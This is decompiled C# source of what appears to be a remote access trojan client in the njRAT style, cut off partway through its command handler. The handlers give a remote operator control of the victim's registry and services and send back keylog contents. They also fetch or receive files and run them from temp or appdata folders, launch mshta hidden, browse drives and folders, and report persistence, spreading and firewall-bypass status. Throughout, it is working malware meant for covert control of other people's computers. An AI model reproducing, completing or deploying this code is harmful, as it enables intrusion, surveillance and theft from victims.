using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class IND
{
	public delegate void indd(string T);

	public static string TM = Interaction.Environ("temp") + "\\";

	public static string Y = "^:^";

	private static int ER;

	public static int LPING;

	public static chat Ca = new chat();

	private static byte[] cdll;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private static string pk;

	static IND()
	{
		byte[] cam = Resources.Cam;
		bool Compress = false;
		cdll = API.ZIP(cam, ref Compress);
	}

	public static void inddd(string T)
	{
		RichTextBox t = B.Chat.T1;
		t.set_Text(t.get_Text() + B.Chat.nick + " : " + T + "\r\n");
	}

	public static RegistryKey Rk(ref string p, ref bool W)
	{
		Array array = Strings.Split(p, "\\", -1, (CompareMethod)0);
		object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CLASSES_ROOT", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_USER", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_LOCAL_MACHINE", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_USERS", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_Users().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_CONFIG", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		RegistryKey result = default(RegistryKey);
		return result;
	}

	public static void ind(byte[] Da)
	{
		//IL_09ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b15: Expected O, but got Unknown
		//IL_1b2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b31: Expected O, but got Unknown
		//IL_295d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2964: Expected O, but got Unknown
		//IL_3c48: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c4f: Expected O, but got Unknown
		//IL_3dba: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dc1: Expected O, but got Unknown
		ER = 0;
		string @string = Encoding.UTF8.GetString(Da);
		int num2 = default(int);
		try
		{
			Array array = Strings.Split(@string, Y, -1, (CompareMethod)0);
			switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString())
			{
			case "#KON":
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"T", false))
				{
					B.KON = true;
				}
				else
				{
					B.KON = false;
				}
				break;
			case "#RG":
			{
				ER = 1;
				object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj, (object)"~", false))
				{
					object[] array4 = new object[1];
					object[] array5 = array4;
					int num6 = 2;
					array5[0] = 2;
					string p = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					bool Compress = false;
					RegistryKey registryKey = Rk(ref p, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, p }, (string[])null, true, false);
					RegistryKey registryKey2 = registryKey;
					string[] subKeyNames = registryKey2.GetSubKeyNames();
					string text4 = default(string);
					foreach (string text3 in subKeyNames)
					{
						string text5 = text4;
						p = text3 + Y + Y + "Key";
						text4 = text5 + API.ENB(ref p) + Y;
					}
					string[] valueNames = registryKey2.GetValueNames();
					foreach (string text6 in valueNames)
					{
						string text7 = registryKey2.GetValue(text6, RuntimeHelpers.GetObjectValue(new object()))!.ToString();
						if (text7.Length > 200)
						{
							text7 = Strings.Mid(text7, 1, 200);
						}
						string text8 = text4;
						p = text6 + Y + text7 + Y + "Value";
						text4 = text8 + API.ENB(ref p) + Y;
					}
					B b2 = MyProject.Forms.B;
					p = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat("#RG" + Y, "~"), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y), (object)text4));
					b2.SEND(ref p);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)"!", false))
				{
					object[] array4 = new object[1];
					object[] array6 = array4;
					int num6 = 2;
					array6[0] = 2;
					string p = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					bool Compress = true;
					RegistryKey registryKey3 = Rk(ref p, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, p }, (string[])null, true, false);
					RegistryKey registryKey4 = registryKey3;
					registryKey4.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 4 }, (string[])null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)"@", false))
				{
					object[] array4 = new object[1];
					object[] array7 = array4;
					int num6 = 2;
					array7[0] = 2;
					string p = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					bool Compress = true;
					RegistryKey registryKey5 = Rk(ref p, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, p }, (string[])null, true, false);
					RegistryKey registryKey6 = registryKey5;
					int num7 = array.Length - 1;
					for (int num8 = 3; num8 <= num7; num8++)
					{
						Array array8 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num8 }, (string[])null)), "\\", -1, (CompareMethod)0);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array8, new object[1] { 1 }, (string[])null), (object)"Key", false))
						{
							registryKey6.DeleteSubKeyTree(Conversions.ToString(NewLateBinding.LateIndexGet((object)array8, new object[1] { 0 }, (string[])null)));
						}
						else
						{
							registryKey6.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array8, new object[1] { 0 }, (string[])null)));
						}
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)"#", false))
				{
					object[] array4 = new object[1];
					object[] array9 = array4;
					int num6 = 2;
					array9[0] = 2;
					string p = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					bool Compress = true;
					RegistryKey registryKey7 = Rk(ref p, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, p }, (string[])null, true, false);
					RegistryKey registryKey8 = registryKey7;
					registryKey8.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
				}
				break;
			}
			case "#k":
				ER = 1;
				if (File.Exists(Application.get_StartupPath() + "\\" + B.exename) && FileSystem.FileLen(Application.get_StartupPath() + "\\" + B.exename) > 0L)
				{
					B b17 = MyProject.Forms.B;
					string p = "#k" + Y + File.ReadAllText(Application.get_StartupPath() + "\\" + B.exename);
					b17.SEND(ref p);
				}
				else
				{
					B b18 = MyProject.Forms.B;
					string p = "#k" + Y + "..";
					b18.SEND(ref p);
				}
				break;
			case "#X":
			{
				ER = 0;
				int num27 = 8 + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length;
				MemoryStream memoryStream11 = new MemoryStream();
				int num28 = Da.Length - 1;
				for (int num29 = num27; num29 <= num28; num29++)
				{
					memoryStream11.WriteByte(Da[num29]);
				}
				byte[] byt3 = memoryStream11.ToArray();
				bool Compress = false;
				byte[] bytes = API.ZIP(byt3, ref Compress);
				int num30 = 0;
				do
				{
					if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num30), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
					{
						try
						{
							File.Delete(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num30), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
							File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num30), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
							NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num30), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
							break;
						}
						catch (Exception ex17)
						{
							ProjectData.SetProjectError(ex17, num2);
							ProjectData.ClearProjectError();
						}
						num30++;
						continue;
					}
					File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num30), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num30), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				}
				while (num30 <= 999);
				break;
			}
			case "##":
			{
				ER = 5;
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().SetValue("p", RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				B b10 = MyProject.Forms.B;
				string p = "plugin";
				b10.SEND(ref p);
				break;
			}
			case "#Rec":
				B.XRec = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				MyProject.Forms.B.Dis();
				break;
			case "#ser0":
			{
				ER = 1;
				ServiceController[] services3 = ServiceController.GetServices();
				string text40 = default(string);
				string p;
				foreach (ServiceController val7 in services3)
				{
					string text41 = text40;
					string y7 = Y;
					p = val7.get_ServiceName() + "{}" + Strings.Replace(Strings.Replace(Conversions.ToString(val7.get_CanStop()), Conversions.ToString(true), "Yes", 1, -1, (CompareMethod)0), Conversions.ToString(false), "No", 1, -1, (CompareMethod)0) + "{}" + ((Enum)val7.get_Status()).ToString() + "{}" + val7.get_DisplayName();
					text40 = text41 + y7 + API.ENB(ref p);
				}
				B b24 = MyProject.Forms.B;
				p = "#ser0" + text40;
				b24.SEND(ref p);
				break;
			}
			case "#ser1":
			{
				ER = 1;
				ServiceController[] services2 = ServiceController.GetServices();
				foreach (ServiceController val6 in services2)
				{
					if (Operators.ConditionalCompareObjectEqual((object)val6.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
					{
						val6.Start();
					}
				}
				break;
			}
			case "#ser2":
			{
				ER = 1;
				ServiceController[] services = ServiceController.GetServices();
				foreach (ServiceController val5 in services)
				{
					if (Operators.ConditionalCompareObjectEqual((object)val5.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
					{
						val5.Stop();
					}
				}
				break;
			}
			case "#R":
			{
				ER = 0;
				B.Nkey.SetValue("vname", RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				B.Vname = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				B b14 = MyProject.Forms.B;
				string p = Conversions.ToString(Operators.ConcatenateObject((object)("#R" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				b14.SEND(ref p);
				break;
			}
			case "ping":
			{
				B b12 = MyProject.Forms.B;
				string p = "pong";
				b12.SEND(ref p);
				break;
			}
			case "#0":
			{
				ER = 0;
				B b19 = MyProject.Forms.B;
				string p = "#red";
				b19.SEND(ref p);
				Thread thread2 = new Thread(delegate(object a0)
				{
					Du((Array)a0);
				});
				object[] array4 = new object[1];
				object[] array49 = array4;
				int num6 = 1;
				array49[0] = 1;
				p = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
				string text31 = API.DEB(ref p);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, p }, (string[])null, true, false);
				Du(Strings.Split(text31, Y, -1, (CompareMethod)0));
				do
				{
					num2 = 0;
					Thread.Sleep(5);
				}
				while (thread2.IsAlive);
				B b20 = MyProject.Forms.B;
				p = "#Bla";
				b20.SEND(ref p);
				break;
			}
			case "#1":
			{
				B b6 = MyProject.Forms.B;
				string p = "#red";
				b6.SEND(ref p);
				ER = 0;
				Thread thread = new Thread(delegate(object a0)
				{
					DT((Array)a0);
				});
				object[] array4 = new object[1];
				object[] array20 = array4;
				int num6 = 1;
				array20[0] = 1;
				p = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
				string text12 = API.DEB(ref p);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, p }, (string[])null, true, false);
				DT(Strings.Split(text12, Y, -1, (CompareMethod)0));
				do
				{
					num2 = 1;
					Thread.Sleep(5);
				}
				while (thread.IsAlive);
				B b7 = MyProject.Forms.B;
				p = "#Bla";
				b7.SEND(ref p);
				break;
			}
			case "#2":
			{
				ER = 0;
				string text37 = "." + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0)[Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0).Length - 1];
				int num36 = 0;
				int num37 = default(int);
				do
				{
					IL_0e73:
					if (File.Exists(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num36) + text37))
					{
						try
						{
							File.Delete(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num36) + text37);
							num37++;
							if (num37 > 5)
							{
								break;
							}
						}
						catch (Exception ex20)
						{
							ProjectData.SetProjectError(ex20, num2);
							ProjectData.ClearProjectError();
							goto IL_0e61;
						}
						goto IL_0e73;
					}
					string text38 = Interaction.Environ("appdata") + "\\" + Conversions.ToString(num36) + text37;
					Network network = ((ServerComputer)MyProject.Computer).get_Network();
					object[] array57 = new object[2];
					object[] array58 = array57;
					object[] array4 = new object[1];
					object[] array59 = array4;
					int num6 = 1;
					array59[0] = 1;
					array58[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					array57[1] = text38;
					object[] array60 = array57;
					object[] array61 = array60;
					bool[] array62 = new bool[2] { true, true };
					NewLateBinding.LateCall((object)network, (Type)null, "DownloadFile", array61, (string[])null, (Type[])null, array62, true);
					if (array62[0])
					{
						NewLateBinding.LateIndexSetComplex((object)array, new object[2]
						{
							num6,
							RuntimeHelpers.GetObjectValue(array60[0])
						}, (string[])null, true, false);
					}
					if (array62[1])
					{
						text38 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array60[1]), typeof(string));
					}
					Process.Start(text38);
					break;
					IL_0e61:
					num36++;
				}
				while (num36 <= 9999);
				break;
			}
			case "#3":
			{
				ER = 0;
				MemoryStream memoryStream13 = new MemoryStream();
				byte[] bytes2 = Encoding.Default.GetBytes("#4" + Y);
				memoryStream13.Write(bytes2, 0, bytes2.Length);
				Encoding @default = Encoding.Default;
				string p = "plugin.C";
				string T = "Pass";
				object P = null;
				string S = Conversions.ToString(global::n.C.inv(ref global::n.C.Plug, ref p, ref T, ref P));
				byte[] bytes3 = @default.GetBytes(API.ENB(ref S));
				bool Compress = true;
				bytes2 = API.ZIP(bytes3, ref Compress);
				memoryStream13.Write(bytes2, 0, bytes2.Length);
				MyProject.Forms.B.WC.SendData(memoryStream13.ToArray());
				break;
			}
			case "#4":
				if (B.Rec)
				{
					ProjectData.EndApp();
				}
				ER = 0;
				try
				{
					MyProject.Forms.B.BW.B.Dispose();
					A.fj.Dispose();
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2, num2);
					ProjectData.ClearProjectError();
				}
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"!", false))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(B.SU);
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3, num2);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(B.SU);
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4, num2);
						ProjectData.ClearProjectError();
					}
					try
					{
						B.Nkey.DeleteValue("vname");
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5, num2);
						ProjectData.ClearProjectError();
					}
					try
					{
						B.Nkey.DeleteValue("FL");
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6, num2);
						ProjectData.ClearProjectError();
					}
					try
					{
						DriveInfo[] drives = DriveInfo.GetDrives();
						foreach (DriveInfo driveInfo in drives)
						{
							if (!driveInfo.IsReady || driveInfo.TotalFreeSpace <= 0L)
							{
								continue;
							}
							try
							{
								if (File.Exists(driveInfo.Name + B.Uo))
								{
									File.Delete(driveInfo.Name + B.Uo);
								}
							}
							catch (Exception ex7)
							{
								ProjectData.SetProjectError(ex7, num2);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception ex8)
					{
						ProjectData.SetProjectError(ex8, num2);
						ProjectData.ClearProjectError();
					}
					Process[] processesByName = Process.GetProcessesByName("wscript");
					foreach (Process process in processesByName)
					{
						try
						{
							process.Kill();
						}
						catch (Exception ex9)
						{
							ProjectData.SetProjectError(ex9, num2);
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						string path2 = Application.get_StartupPath() + "\\j.vbs";
						string S = Resources.W;
						File.WriteAllText(path2, API.DEB(ref S).Replace("NJ", Application.get_ExecutablePath()));
						Process.Start(Application.get_StartupPath() + "\\j.vbs");
					}
					catch (Exception ex10)
					{
						ProjectData.SetProjectError(ex10, num2);
						ProjectData.ClearProjectError();
					}
				}
				ProjectData.EndApp();
				break;
			case "#5":
			{
				ER = 0;
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				processStartInfo2.FileName = "mshta.exe";
				processStartInfo2.Arguments = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				processStartInfo2.CreateNoWindow = true;
				processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				Process process3 = Process.Start(processStartInfo2);
				Thread.Sleep(60000);
				try
				{
					process3.Kill();
					break;
				}
				catch (Exception ex23)
				{
					ProjectData.SetProjectError(ex23, num2);
					ProjectData.ClearProjectError();
					break;
				}
			}
			case "#6":
				ER = 0;
				try
				{
					MyProject.Forms.B.BW.B.Dispose();
					if (A.fj.Id > 1)
					{
						A.fj.Kill();
					}
				}
				catch (Exception ex22)
				{
					ProjectData.SetProjectError(ex22, num2);
					ProjectData.ClearProjectError();
				}
				Process.Start(Application.get_ExecutablePath());
				ProjectData.EndApp();
				break;
			case "#7":
			{
				ER = 2;
				object[] array12 = new object[1];
				object[] array53 = array12;
				int num6 = 1;
				array53[0] = 1;
				int num5 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
				byte[] array54 = sc.gc(ref num5);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, num5 }, (string[])null, true, false);
				byte[] array55 = array54;
				if (array55.Length == 0)
				{
					B b22 = MyProject.Forms.B;
					string S = "#5" + Y + Conversions.ToString(0);
					b22.SEND(ref S);
				}
				else
				{
					MemoryStream memoryStream12 = new MemoryStream();
					memoryStream12.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
					memoryStream12.Write(array55, 0, array55.Length);
					MyProject.Forms.B.WC.SendData(memoryStream12.ToArray());
				}
				break;
			}
			case "#8":
			{
				string text35 = "\r\n";
				string text36 = text36 + "PC InfoX*X==" + text35;
				text36 = text36 + "PC\\UserX*X" + B.PC + text35;
				text36 = text36 + "CountryX*X" + API.Gc() + text35;
				text36 = text36 + "OSX*X" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Windows", "")
					.Replace("  ", " ")
					.Replace("Microsoft", "")
					.Replace("®", "")
					.Replace("™", "") + text35;
				text36 = Conversions.ToString(Operators.AddObject((object)text36, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ProcessorX*X", ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")!.GetValue("~mhz")), (object)" *"), (object)Environment.ProcessorCount), (object)"~MHZ"), (object)text35)));
				text36 = text36 + "RAMX*X" + Strings.Format((object)((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1073741824.0), "#0.00 GB") + text35;
				text36 = text36 + "UpTimeX*X" + Strings.Split(Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5), ".", -1, (CompareMethod)0)[0] + " :Hours" + text35;
				text36 = text36 + "Server InfoX*X==" + text35;
				text36 = text36 + "ServerX*X" + API.DEB(ref B.Vname) + text35;
				text36 = text36 + "Host:PortX*X" + B.no + text35;
				text36 = text36 + "DirectoryX*X" + Application.get_StartupPath() + text35;
				text36 = text36 + "ExeNameX*X" + AppDomain.CurrentDomain.FriendlyName + text35;
				text36 = text36 + "Process IDX*X" + Conversions.ToString(Process.GetCurrentProcess().Id) + text35;
				text36 = text36 + "StartupX*X" + B.SU + text35;
				text36 = text36 + "PersistantX*X" + Conversions.ToString(B.UU) + text35;
				text36 = text36 + "SpreadX*X" + B.spread + text35;
				text36 = text36 + "MutexX*X" + B.mU + text35;
				text36 = text36 + "First RunX*X" + B.FR + text35;
				text36 = text36 + "RegKeyX*X" + B.Nkey.Name + text35;
				text36 = text36 + "Firewall BypassX*X" + Strings.Replace(B.Fw.ToString(), "True", "Yes", 1, -1, (CompareMethod)0).Replace("False", "No");
				B b21 = MyProject.Forms.B;
				string S = "#7" + Y + API.ENB(ref text36);
				b21.SEND(ref S);
				break;
			}
			case "#9":
			{
				ER = 1;
				DriveInfo[] drives2 = DriveInfo.GetDrives();
				string text29 = default(string);
				string S;
				foreach (DriveInfo driveInfo2 in drives2)
				{
					if (driveInfo2.IsReady)
					{
						string text30 = text29;
						string y6 = Y;
						S = driveInfo2.Name;
						text29 = text30 + y6 + API.ENB(ref S);
					}
				}
				B b16 = MyProject.Forms.B;
				string[] array37 = new string[8] { "#8", text29, Y, null, null, null, null, null };
				string[] array46 = array37;
				string p = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
				array46[3] = API.ENB(ref p);
				array37[4] = Y;
				string[] array47 = array37;
				string T = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
				array47[5] = API.ENB(ref T);
				array37[6] = Y;
				string[] array48 = array37;
				S = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
				array48[7] = API.ENB(ref S);
				string C = string.Concat(array37);
				b16.SEND(ref C);
				break;
			}
			case "#10":
			{
				ER = 1;
				object[] array12 = new object[1];
				object[] array32 = array12;
				int num5 = 1;
				array32[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
				string path10 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				string[] directories = Directory.GetDirectories(path10);
				string text18 = default(string);
				foreach (string text17 in directories)
				{
					string text19 = text18;
					string y2 = Y;
					object[] array4 = new object[1];
					object[] array33 = array4;
					int num6 = 1;
					array33[0] = 1;
					string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text20 = API.DEB(ref S);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, S }, (string[])null, true, false);
					string T = Strings.Replace(text17, text20, "", 1, -1, (CompareMethod)0) + "*DIR";
					text18 = text19 + y2 + API.ENB(ref T);
				}
				string[] array34 = new string[5] { "png", "jpg", "jpeg", "bmp", "ico" };
				array12 = new object[1];
				object[] array35 = array12;
				num5 = 1;
				array35[0] = 1;
				C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
				string path11 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				string[] files = Directory.GetFiles(path11);
				bool flag = default(bool);
				foreach (string text21 in files)
				{
					string[] array36 = array34;
					foreach (string text22 in array36)
					{
						if (Operators.CompareString(text22.ToLower(), Strings.Split(text21, ".", -1, (CompareMethod)0)[Strings.Split(text21, ".", -1, (CompareMethod)0).Length - 1].ToLower(), false) == 0)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						try
						{
							Image val3 = Image.FromFile(text21);
							MemoryStream memoryStream10 = new MemoryStream();
							EncoderParameters val4 = new EncoderParameters(1);
							val4.get_Param()[0] = new EncoderParameter(Encoder.Quality, 40L);
							ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
							Image thumbnailImage = val3.GetThumbnailImage(20, 20, (GetThumbnailImageAbort)null, IntPtr.Zero);
							thumbnailImage.Save((Stream)memoryStream10, encoderInfo, val4);
							string text23 = text18;
							string y3 = Y;
							string[] array37 = new string[5];
							string[] array38 = array37;
							array12 = new object[1];
							object[] array39 = array12;
							num5 = 1;
							array39[0] = 1;
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
							string text24 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
							array38[0] = Strings.Replace(text21, text24, "", 1, -1, (CompareMethod)0);
							array37[1] = "*";
							array37[2] = Conversions.ToString(FileSystem.FileLen(text21));
							array37[3] = "*";
							array37[4] = API.FEN(memoryStream10.ToArray());
							string S = string.Concat(array37);
							text18 = text23 + y3 + API.ENB(ref S);
							memoryStream10.Dispose();
							val4.Dispose();
							val3.Dispose();
						}
						catch (Exception ex16)
						{
							ProjectData.SetProjectError(ex16, num2);
							string text25 = text18;
							string y4 = Y;
							array12 = new object[1];
							object[] array40 = array12;
							num5 = 1;
							array40[0] = 1;
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
							string text26 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
							string S = Strings.Replace(text21, text26, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text21));
							text18 = text25 + y4 + API.ENB(ref S);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						string text27 = text18;
						string y5 = Y;
						array12 = new object[1];
						object[] array41 = array12;
						num5 = 1;
						array41[0] = 1;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array12, (string[])null));
						string text28 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
						string S = Strings.Replace(text21, text28, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text21));
						text18 = text27 + y5 + API.ENB(ref S);
					}
				}
				B b13 = MyProject.Forms.B;
				C = "#9" + text18;
				b13.SEND(ref C);
				text18 = "";
				break;
			}
			case "#11":
			{
				ER = 1;
				int num21 = array.Length - 1;
				for (int num22 = 1; num22 <= num21; num22++)
				{
					try
					{
						string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num22 }, (string[])null));
						string fileName = API.DEB(ref C);
